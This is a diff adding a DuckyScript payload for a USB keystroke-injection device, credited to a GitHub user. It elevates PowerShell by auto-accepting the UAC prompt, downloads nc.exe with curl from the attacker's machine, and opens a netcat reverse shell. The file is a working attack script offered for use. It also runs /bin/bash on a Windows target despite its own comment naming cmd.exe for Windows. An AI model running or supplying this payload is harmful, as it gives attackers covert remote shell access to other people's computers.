@@ -1,0 +1,25 @@
+REM DuckyScript by Github User: hannah-ashna
+REM Open up powershell via Windows Key + R
+REM We need Administrator access in order to modify certain files
+REM Hence we use -Verb runAs to elevate powershell
+DELAY 750
+GUI r
+DELAY 1000
+STRING powershell Start-Process Powershell -Verb runAs
+ENTER
+DELAY 700
+ALT y
+
+REM To create the reverse shell we need to get netcat installed onto the current machine
+REM There's different ways of doing it, this method requires you setup a SimpleHTTPServer
+REM on your main device to transfer the nc.exe file across
+DELAY 500
+STRING curl http://[Your Local Machine's IP]:[Port]/nc.exe -o nc.exe
+ENTER
+
+REM Create the reverse shell
+DELAY 700
+
+REM Use /bin/bash for Linux and cmd.exe for Windows
+STRING nc -e /bin/bash [Your Local Machine's IP] [The port you've chosen to listen on, e.g. 1234]
+ENTER
